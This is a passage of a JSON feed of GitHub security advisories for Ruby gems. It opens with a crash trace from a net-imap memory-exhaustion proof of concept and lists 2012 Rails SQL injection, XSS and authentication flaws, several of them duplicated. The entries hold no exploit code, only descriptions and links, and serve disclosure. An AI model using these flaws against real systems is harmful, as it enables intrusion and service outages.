(NoMemoryError)\n/gems/net-imap-0.5.5/lib/net/imap.rb:3271:in 'Net::IMAP#get_tagged_response': failed to allocate memory (NoMemoryError)\n        from /gems/net-imap-0.5.5/lib/net/imap.rb:3371:in 'block in Net::IMAP#send_command'\n        from /rubylibdir/monitor.rb:201:in 'Monitor#synchronize'\n        from /rubylibdir/monitor.rb:201:in 'MonitorMixin#mon_synchronize'\n        from /gems/net-imap-0.5.5/lib/net/imap.rb:3353:in 'Net::IMAP#send_command'\n        from /gems/net-imap-0.5.5/lib/net/imap.rb:1128:in 'block in Net::IMAP#capability'\n        from /rubylibdir/monitor.rb:201:in 'Monitor#synchronize'\n        from /rubylibdir/monitor.rb:201:in 'MonitorMixin#mon_synchronize'\n        from /gems/net-imap-0.5.5/lib/net/imap.rb:1127:in 'Net::IMAP#capability'\n        from /workspace/poc.rb:70:in '&lt;main&gt;'\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ruby/net-imap/security/advisories/GHSA-7fc5-f82f-cx69\">https://github.com/ruby/net-imap/security/advisories/GHSA-7fc5-f82f-cx69</a></li>\n<li><a href=\"https://github.com/ruby/net-imap/commit/70e3ddd071a94e450b3238570af482c296380b35\">https://github.com/ruby/net-imap/commit/70e3ddd071a94e450b3238570af482c296380b35</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7fc5-f82f-cx69\">https://github.com/advisories/GHSA-7fc5-f82f-cx69</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7fc5-f82f-cx69",
            "title": "[net-imap] Possible DoS by memory exhaustion in net-imap",
            "date_modified": "2025-02-10T17:42:44.000Z",
            "date_published": "2025-02-10T17:42:43.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7fc5-f82f-cx69"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p><code>actionpack/lib/action_dispatch/http/request.rb</code> in Ruby on Rails before 2.3.16, 3.0.x before 3.0.13, 3.1.x before 3.1.5, and 3.2.x before 3.2.4 does not properly consider differences in parameter handling between the Active Record component and the Rack interface, which allows remote attackers to bypass intended database-query restrictions and perform NULL checks via a crafted request, as demonstrated by certain <code>[nil]</code> values, a related issue to CVE-2012-2694.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2012-2660\">https://nvd.nist.gov/vuln/detail/CVE-2012-2660</a></li>\n<li><a href=\"https://groups.google.com/group/rubyonrails-security/msg/d890f8d58b5fbf32?dmode=source&amp;output=gplain\">https://groups.google.com/group/rubyonrails-security/msg/d890f8d58b5fbf32?dmode=source&amp;output=gplain</a></li>\n<li><a href=\"http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00002.html\">http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00002.html</a></li>\n<li><a href=\"http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00014.html\">http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00014.html</a></li>\n<li><a href=\"http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00016.html\">http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00016.html</a></li>\n<li><a href=\"http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00017.html\">http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00017.html</a></li>\n<li><a href=\"http://lists.opensuse.org/opensuse-updates/2012-08/msg00046.html\">http://lists.opensuse.org/opensuse-updates/2012-08/msg00046.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2013-0154.html\">http://rhn.redhat.com/errata/RHSA-2013-0154.html</a></li>\n<li><a href=\"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2012-2660.yml\">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2012-2660.yml</a></li>\n<li><a href=\"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/activerecord/CVE-2012-2660.yml\">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/activerecord/CVE-2012-2660.yml</a></li>\n<li><a href=\"https://groups.google.com/g/rubyonrails-security/c/8SA-M3as7A8/m/Mr9fi9X4kNgJ\">https://groups.google.com/g/rubyonrails-security/c/8SA-M3as7A8/m/Mr9fi9X4kNgJ</a></li>\n<li><a href=\"https://github.com/rails/rails/commit/61eed87ce32caf534bf1f52dd8134097b4ad9e1b\">https://github.com/rails/rails/commit/61eed87ce32caf534bf1f52dd8134097b4ad9e1b</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hgpp-pp89-4fgf\">https://github.com/advisories/GHSA-hgpp-pp89-4fgf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-hgpp-pp89-4fgf",
            "title": "[actionpack] Action Pack contains database-query restrictions bypass",
            "date_modified": "2025-01-22T15:18:27.000Z",
            "date_published": "2017-10-24T18:33:38.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-hgpp-pp89-4fgf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p><code>actionpack/lib/action_dispatch/http/request.rb</code> in Ruby on Rails before 2.3.16, 3.0.x before 3.0.13, 3.1.x before 3.1.5, and 3.2.x before 3.2.4 does not properly consider differences in parameter handling between the Active Record component and the Rack interface, which allows remote attackers to bypass intended database-query restrictions and perform NULL checks via a crafted request, as demonstrated by certain <code>[nil]</code> values, a related issue to CVE-2012-2694.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2012-2660\">https://nvd.nist.gov/vuln/detail/CVE-2012-2660</a></li>\n<li><a href=\"https://groups.google.com/group/rubyonrails-security/msg/d890f8d58b5fbf32?dmode=source&amp;output=gplain\">https://groups.google.com/group/rubyonrails-security/msg/d890f8d58b5fbf32?dmode=source&amp;output=gplain</a></li>\n<li><a href=\"http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00002.html\">http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00002.html</a></li>\n<li><a href=\"http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00014.html\">http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00014.html</a></li>\n<li><a href=\"http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00016.html\">http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00016.html</a></li>\n<li><a href=\"http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00017.html\">http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00017.html</a></li>\n<li><a href=\"http://lists.opensuse.org/opensuse-updates/2012-08/msg00046.html\">http://lists.opensuse.org/opensuse-updates/2012-08/msg00046.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2013-0154.html\">http://rhn.redhat.com/errata/RHSA-2013-0154.html</a></li>\n<li><a href=\"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2012-2660.yml\">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2012-2660.yml</a></li>\n<li><a href=\"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/activerecord/CVE-2012-2660.yml\">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/activerecord/CVE-2012-2660.yml</a></li>\n<li><a href=\"https://groups.google.com/g/rubyonrails-security/c/8SA-M3as7A8/m/Mr9fi9X4kNgJ\">https://groups.google.com/g/rubyonrails-security/c/8SA-M3as7A8/m/Mr9fi9X4kNgJ</a></li>\n<li><a href=\"https://github.com/rails/rails/commit/61eed87ce32caf534bf1f52dd8134097b4ad9e1b\">https://github.com/rails/rails/commit/61eed87ce32caf534bf1f52dd8134097b4ad9e1b</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hgpp-pp89-4fgf\">https://github.com/advisories/GHSA-hgpp-pp89-4fgf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-hgpp-pp89-4fgf",
            "title": "[actionpack] Action Pack contains database-query restrictions bypass",
            "date_modified": "2025-01-22T15:18:27.000Z",
            "date_published": "2017-10-24T18:33:38.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-hgpp-pp89-4fgf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The <code>decode_credentials</code> method in <code>actionpack/lib/action_controller/metal/http_authentication.rb</code> in Ruby on Rails before 3.0.16, 3.1.x before 3.1.7, and 3.2.x before 3.2.7 converts Digest Authentication strings to symbols, which allows remote attackers to cause a denial of service by leveraging access to an application that uses a <code>with_http_digest</code> helper method, as demonstrated by the <code>authenticate_or_request_with_http_digest</code> method.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2012-3424\">https://nvd.nist.gov/vuln/detail/CVE-2012-3424</a></li>\n<li><a href=\"https://groups.google.com/group/rubyonrails-security/msg/244d32f2fa25147d?hl=en&amp;dmode=source&amp;output=gplain\">https://groups.google.com/group/rubyonrails-security/msg/244d32f2fa25147d?hl=en&amp;dmode=source&amp;output=gplain</a></li>\n<li><a href=\"http://lists.opensuse.org/opensuse-updates/2012-08/msg00046.html\">http://lists.opensuse.org/opensuse-updates/2012-08/msg00046.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2013-0154.html\">http://rhn.redhat.com/errata/RHSA-2013-0154.html</a></li>\n<li><a href=\"https://github.com/rails/rails/commit/3719bd3e95523c5518507dbe44f260f252930600\">https://github.com/rails/rails/commit/3719bd3e95523c5518507dbe44f260f252930600</a></li>\n<li><a href=\"http://weblog.rubyonrails.org/2012/7/26/ann-rails-3-2-7-has-been-released\">http://weblog.rubyonrails.org/2012/7/26/ann-rails-3-2-7-has-been-released</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-92w9-2pqw-rhjj\">https://github.com/advisories/GHSA-92w9-2pqw-rhjj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-92w9-2pqw-rhjj",
            "title": "[actionpack] actionpack Improper Authentication vulnerability",
            "date_modified": "2025-01-22T15:09:52.000Z",
            "date_published": "2017-10-24T18:33:38.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-92w9-2pqw-rhjj"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The <code>decode_credentials</code> method in <code>actionpack/lib/action_controller/metal/http_authentication.rb</code> in Ruby on Rails before 3.0.16, 3.1.x before 3.1.7, and 3.2.x before 3.2.7 converts Digest Authentication strings to symbols, which allows remote attackers to cause a denial of service by leveraging access to an application that uses a <code>with_http_digest</code> helper method, as demonstrated by the <code>authenticate_or_request_with_http_digest</code> method.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2012-3424\">https://nvd.nist.gov/vuln/detail/CVE-2012-3424</a></li>\n<li><a href=\"https://groups.google.com/group/rubyonrails-security/msg/244d32f2fa25147d?hl=en&amp;dmode=source&amp;output=gplain\">https://groups.google.com/group/rubyonrails-security/msg/244d32f2fa25147d?hl=en&amp;dmode=source&amp;output=gplain</a></li>\n<li><a href=\"http://lists.opensuse.org/opensuse-updates/2012-08/msg00046.html\">http://lists.opensuse.org/opensuse-updates/2012-08/msg00046.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2013-0154.html\">http://rhn.redhat.com/errata/RHSA-2013-0154.html</a></li>\n<li><a href=\"https://github.com/rails/rails/commit/3719bd3e95523c5518507dbe44f260f252930600\">https://github.com/rails/rails/commit/3719bd3e95523c5518507dbe44f260f252930600</a></li>\n<li><a href=\"http://weblog.rubyonrails.org/2012/7/26/ann-rails-3-2-7-has-been-released\">http://weblog.rubyonrails.org/2012/7/26/ann-rails-3-2-7-has-been-released</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-92w9-2pqw-rhjj\">https://github.com/advisories/GHSA-92w9-2pqw-rhjj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-92w9-2pqw-rhjj",
            "title": "[actionpack] actionpack Improper Authentication vulnerability",
            "date_modified": "2025-01-22T15:09:52.000Z",
            "date_published": "2017-10-24T18:33:38.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-92w9-2pqw-rhjj"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>SQL injection vulnerability in the Active Record component in Ruby on Rails before 2.3.15, 3.0.x before 3.0.18, 3.1.x before 3.1.9, and 3.2.x before 3.2.10 allows remote attackers to execute arbitrary SQL commands via a crafted request that leverages incorrect behavior of dynamic finders in applications that can use unexpected data types in certain find_by_ method calls.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2012-6496\">https://nvd.nist.gov/vuln/detail/CVE-2012-6496</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=889649\">https://bugzilla.redhat.com/show_bug.cgi?id=889649</a></li>\n<li><a href=\"https://groups.google.com/group/rubyonrails-security/msg/23daa048baf28b64?dmode=source&amp;output=gplain\">https://groups.google.com/group/rubyonrails-security/msg/23daa048baf28b64?dmode=source&amp;output=gplain</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2013-0154.html\">http://rhn.redhat.com/errata/RHSA-2013-0154.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2013-0220.html\">http://rhn.redhat.com/errata/RHSA-2013-0220.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2013-0544.html\">http://rhn.redhat.com/errata/RHSA-2013-0544.html</a></li>\n<li><a href=\"http://security.gentoo.org/glsa/glsa-201401-22.xml\">http://security.gentoo.org/glsa/glsa-201401-22.xml</a></li>\n<li><a href=\"https://github.com/rails/rails/commit/9de9b359d0d24f70f0f6c5c58a7ad8750684d456\">https://github.com/rails/rails/commit/9de9b359d0d24f70f0f6c5c58a7ad8750684d456</a></li>\n<li><a href=\"http://blog.phusion.nl/2013/01/03/rails-sql-injection-vulnerability-hold-your-horses-here-are-the-facts\">http://blog.phusion.nl/2013/01/03/rails-sql-injection-vulnerability-hold-your-horses-here-are-the-facts</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-gh2w-j7cx-2664\">https://github.com/advisories/GHSA-gh2w-j7cx-2664</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-gh2w-j7cx-2664",
            "title": "[activerecord] Active Record contains SQL Injection",
            "date_modified": "2025-01-21T16:47:33.000Z",
            "date_published": "2017-10-24T18:33:37.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-gh2w-j7cx-2664"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Cross-site scripting (XSS) vulnerability in <code>activesupport/lib/active_support/core_ext/string/output_safety.rb</code> in Ruby on Rails before 2.3.16, 3.0.x before , 3.1.x before 3.1.8, and 3.2.x before 3.2.8 might allow remote attackers to inject arbitrary web script or HTML via vectors involving a ' (quote) character.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2012-3464\">https://nvd.nist.gov/vuln/detail/CVE-2012-3464</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-h835-75hw-pj89\">https://github.com/advisories/GHSA-h835-75hw-pj89</a></li>\n<li><a href=\"https://groups.google.com/group/rubyonrails-security/msg/8f1bbe1cef8c6caf?dmode=source&amp;output=gplain\">https://groups.google.com/group/rubyonrails-security/msg/8f1bbe1cef8c6caf?dmode=source&amp;output=gplain</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2013-0154.html\">http://rhn.redhat.com/errata/RHSA-2013-0154.html</a></li>\n<li><a href=\"https://github.com/rails/rails/issues/7215\">https://github.com/rails/rails/issues/7215</a></li>\n<li><a href=\"https://github.com/rails/rails/commit/28f2c6f4037081da0a82104a3f473165ed4ed2ce\">https://github.com/rails/rails/commit/28f2c6f4037081da0a82104a3f473165ed4ed2ce</a></li>\n<li><a href=\"https://github.com/rails/rails/commit/780a718723cf87b49cfe204d355948c4e0932d23\">https://github.com/rails/rails/commit/780a718723cf87b49cfe204d355948c4e0932d23</a></li>\n<li><a href=\"https://github.com/rails/rails/commit/d0c9759d3aeb6327d68dd6c0de0fe2fed4e3c870\">https://github.com/rails/rails/commit/d0c9759d3aeb6327d68dd6c0de0fe2fed4e3c870</a></li>\n<li><a href=\"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/activesupport/CVE-2012-3464.yml\">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/activesupport/CVE-2012-3464.yml</a></li>\n<li><a href=\"https://github.com/rails/rails/commit/d549df7133f2b0bad8112890d478c33e990e12bc\">https://github.com/rails/rails/commit/d549df7133f2b0bad8112890d478c33e990e12bc</a></li>\n<li><a href=\"http://weblog.rubyonrails.org/2012/8/9/ann-rails-3-2-8-has-been-released\">http://weblog.rubyonrails.org/2012/8/9/ann-rails-3-2-8-has-been-released</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-h835-75hw-pj89",
            "title": "[activesupport] activesupport Cross-site Scripting vulnerability",
            "date_modified": "2025-01-21T16:47:01.000Z",
            "date_published": "2017-10-24T18:33:37.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-h835-75hw-pj89"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>SQL injection vulnerability in the Active Record component in Ruby on Rails before 2.3.15, 3.0.x before 3.0.18, 3.1.x before 3.1.9, and 3.2.x before 3.2.10 allows remote attackers to execute arbitrary SQL commands via a crafted request that leverages incorrect behavior of dynamic finders in applications that can use unexpected data types in certain find_by_ method calls.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2012-6496\">https://nvd.nist.gov/vuln/detail/CVE-2012-6496</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=889649\">https://bugzilla.redhat.com/show_bug.cgi?id=889649</a></li>\n<li><a href=\"https://groups.google.com/group/rubyonrails-security/msg/23daa048baf28b64?dmode=source&amp;output=gplain\">https://groups.google.com/group/rubyonrails-security/msg/23daa048baf28b64?dmode=source&amp;output=gplain</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2013-0154.html\">http://rhn.redhat.com/errata/RHSA-2013-0154.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2013-0220.html\">http://rhn.redhat.com/errata/RHSA-2013-0220.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2013-0544.html\">http://rhn.redhat.com/errata/RHSA-2013-0544.html</a></li>\n<li><a href=\"http://security.gentoo.org/glsa/glsa-201401-22.xml\">http://security.gentoo.org/glsa/glsa-201401-22.xml</a></li>\n<li><a href=\"https://github.com/rails/rails/commit/9de9b359d0d24f70f0f6c5c58a7ad8750684d456\">https://github.com/rails/rails/commit/9de9b359d0d24f70f0f6c5c58a7ad8750684d456</a></li>\n<li><a href=\"http://blog.phusion.nl/2013/01/03/rails-sql-injection-vulnerability-hold-your-horses-here-are-the-facts\">http://blog.phusion.nl/2013/01/03/rails-sql-injection-vulnerability-hold-your-horses-here-are-the-facts</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-gh2w-j7cx-2664\">https://github.com/advisories/GHSA-gh2w-j7cx-2664</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-gh2w-j7cx-2664",
            "title": "[activerecord] Active Record contains SQL Injection",
            "date_modified": "2025-01-21T16:47:33.000Z",
            "date_published": "2017-10-24T18:33:37.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-gh2w-j7cx-2664"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Cross-site scripting (XSS) vulnerability in <code>actionpack/lib/action_view/helpers/sanitize_helper.rb</code> in the <code>strip_tags</code> helper in Ruby on Rails before 2.3.16, 3.0.x before 3.0.17, 3.1.x before 3.1.8, and 3.2.x before 3.2.8 allows remote attackers to inject arbitrary web script or HTML via malformed HTML markup.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2012-3465\">https://nvd.nist.gov/vuln/detail/CVE-2012-3465</a></li>\n<li><a href=\"https://groups.google.com/group/rubyonrails-security/msg/7fbb5392d4d282b5?dmode=source&amp;output=gplain\">https://groups.google.com/group/rubyonrails-security/msg/7fbb5392d4d282b5?dmode=source&amp;output=gplain</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2013-0154.html\">http://rhn.redhat.com/errata/RHSA-2013-0154.html</a></li>\n<li><a href=\"https://github.com/rails/rails/commit/e91e4e8bbee12ce1496bf384c04da6be296b687a\">https://github.com/rails/rails/commit/e91e4e8bbee12ce1496bf384c04da6be296b687a</a></li>\n<li><a href=\"https://github.com/rails/rails/commit/cf48c9c7dcbef8543171f7f7de8d3d9a16b58e77\">https://github.com/rails/rails/commit/cf48c9c7dcbef8543171f7f7de8d3d9a16b58e77</a></li>\n<li><a href=\"http://weblog.rubyonrails.org/2012/8/9/ann-rails-3-2-8-has-been-released\">http://weblog.rubyonrails.org/2012/8/9/ann-rails-3-2-8-has-been-released</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7g65-ghrg-hpf5\">https://github.com/advisories/GHSA-7g65-ghrg-hpf5</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7g65-ghrg-hpf5",
            "title": "[actionpack] actionpack Cross-site Scripting vulnerability",
            "date_modified": "2025-01-21T15:21:14.000Z",
            "date_published": "2017-10-24T18:33:37.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7g65-ghrg-hpf5"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Cross-site scripting (XSS) vulnerability in <code>actionpack/lib/action_view/helpers/sanitize_helper.rb</code> in the <code>strip_tags</code> helper in Ruby on Rails before 2.3.16, 3.0.x before 3.0.17, 3.1.x before 3.1.8, and 3.2.x before 3.2.8 allows remote attackers to inject arbitrary web script or HTML via malformed HTML markup.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2012-3465\">https://nvd.nist.gov/vuln/detail/CVE-2012-3465</a></li>\n<li><a href=\"https://groups.google.com/group/rubyonrails-security/msg/7fbb5392d4d282b5?dmode=source&amp;output=gplain\">https://groups.google.com/group/rubyonrails-security/msg/7fbb5392d4d282b5?dmode=source&amp;output=gplain</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2013-0154.html\">http://rhn.redhat.com/errata/RHSA-2013-0154.html</a></li>\n<li><a href=\"https://github.com/rails/rails/commit/e91e4e8bbee12ce1496bf384c04da6be296b687a\">https://github.com/rails/rails/commit/e91e4e8bbee12ce1496bf384c04da6be296b687a</a></li>\n<li><a href=\"https://github.com/rails/rails/commit/cf48c9c7dcbef8543171f7f7de8d3d9a16b58e77\">https://github.com/rails/rails/commit/cf48c9c7dcbef8543171f7f7de8d3d9a16b58e77</a></li>\n<li><a href=\"http://weblog.rubyonrails.org/2012/8/9/ann-rails-3-2-8-has-been-released\">http://weblog.rubyonrails.org/2012/8/9/ann-rails-3-2-8-has-been-released</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7g65-ghrg-hpf5\">https://github.com/advisories/GHSA-7g65-ghrg-hpf5</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7g65-ghrg-hpf5",
            "title": "[actionpack] actionpack Cross-site Scripting vulnerability",
            "date_modified": "2025-01-21T15:21:14.000Z",
            "date_published": "2017-10-24T18:33:37.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7g65-ghrg-hpf5"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Cross-site scripting (XSS) vulnerability in <code>activesupport/lib/active_support/core_ext/string/output_safety.rb</code> in Ruby on Rails before 2.3.16, 3.0.x before , 3.1.x before 3.1.8, and 3.2.x before 3.2.8 might allow remote attackers to inject arbitrary web script or HTML via vectors involving a ' (quote) character.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2012-3464\">https://nvd.nist.gov/vuln/detail/CVE-2012-3464</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-h835-75hw-pj89\">https://github.com/advisories/GHSA-h835-75hw-pj89</a></li>\n<li><a href=\"https://groups.google.com/group/rubyonrails-security/msg/8f1bbe1cef8c6caf?dmode=source&amp;output=gplain\">https://groups.google.com/group/rubyonrails-security/msg/8f1bbe1cef8c6caf?dmode=source&amp;output=gplain</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2013-0154.html\">http://rhn.redhat.com/errata/RHSA-2013-0154.html</a></li>\n<li><a href=\"https://github.com/rails/rails/issues/7215\">https://github.com/rails/rails/issues/7215</a></li>\n<li><a href=\"https://github.com/rails/rails/commit/28f2c6f4037081da0a82104a3f473165ed4ed2ce\">https://github.com/rails/rails/commit/28f2c6f4037081da0a82104a3f473165ed4ed2ce</a></li>\n<li><a href=\"https://github.com/rails/rails/commit/780a718723cf87b49cfe204d355948c4e0932d23\">https://github.com/rails/rails/commit/780a718723cf87b49cfe204d355948c4e0932d23</a></li>\n<li><a href=\"https://github.com/rails/rails/commit/d0c9759d3aeb6327d68dd6c0de0fe2fed4e3c870\">https://github.com/rails/rails/commit/d0c9759d3aeb6327d68dd6c0de0fe2fed4e3c870</a></li>\n<li><a href=\"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/activesupport/CVE-2012-3464.yml\">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/activesupport/CVE-2012-3464.yml</a></li>\n<li><a href=\"https://github.com/rails/rails/commit/d549df7133f2b0bad8112890d478c33e990e12bc\">https://github.com/rails/rails/commit/d549df7133f2b0bad8112890d478c33e990e12bc</a></li>\n<li><a href=\"http://weblog.rubyonrails.org/2012/8/9/ann-rails-3-2-8-has-been-released\">http://weblog.rubyonrails.org/2012/8/9/ann-rails-3-2-8-has-been-released</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-h835-75hw-pj89",
            "title": "[activesupport] activesupport Cross-site Scripting vulnerability",
            "date_modified": "2025-01-21T16:47:01.000Z",
            "date_published": "2017-10-24T18:33:37.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-h835-75hw-pj89"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The Active Record component in Ruby on Rails efore 2.3.15, 3.0.x before 3.0.14, 3.1.x before 3.1.6, and 3.2.x before 3.2.6 does not properly implement the passing of request data to a where method in an ActiveRecord class, which allows remote attackers to conduct certain SQL injection attacks via nested query parameters that leverage improper handling of nested hashes, a related issue to CVE-2012-2661.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2012-2695\">https://nvd.nist.gov/vuln/detail/CVE-2012-2695</a></li>\n<li><a href=\"https://groups.google.com/group/rubyonrails-security/msg/aee3413fb038bf56?dmode=source&amp;output=gplain\">https://groups.google.com/group/rubyonrails-security/msg/aee3413fb038bf56?dmode=source&amp;output=gplain</a></li>\n<li><a href=\"http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00002.html\">http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00002.html</a></li>\n<li><a href=\"http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00014.html\">http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00014.html</a></li>\n<li><a href=\"http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00016.html\">http://lists.opensuse.org/opensuse-security-announce/2012-08/msg00016.html</a></li>\n<li><a href=\"http://lists.opensuse.org/opensuse-updates/2012-08/msg00046.html\">http://lists.opensuse.org/opensuse-updates/2012-08/msg00046.html</a></li>\n<li><a href=\"http://rhn.redhat.com/errata/RHSA-2013-0154.html\">http://rhn.redhat.com/errata/RHSA-2013-0154.html</a></li>\n<li><a href=\"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/activerecord/CVE-2012-2695.yml\">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/activerecord/CVE-2012-2695.yml</a></li>\n<li><a href=\"https://groups.google.com/g/rubyonrails-security/c/l4L0TEVAz1k/m/Vr84sD9B464J\">https://groups.google.com/g/rubyonrails-security/c/l4L0TEVAz1k/m/Vr84sD9B464J</a></li>\n<li><a href=\"https://github.com/rails/rails/commit/62f81f4d6b3ee40e9887ffd92ab14714bad93f18\">https://github.com/rails/rails/commit/62f81f4d6b3ee40e9887ffd92ab14714bad93f18</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-76wq-xw4h-f8wj\">https://github.com/advisories/GHSA-76wq-xw4h-f8wj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-76wq-xw4h-f8wj",
            "title": "[activerecord] activerecord vulnerable to SQL Injection",
            "date_modified": "2025-01-21T15:12:26.000Z",
            "date_published": "2017-10-24T18:33:38.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-76wq-xw4h-f8wj"
            },
            "tags": [
                "severity"
            ]
        },
        {
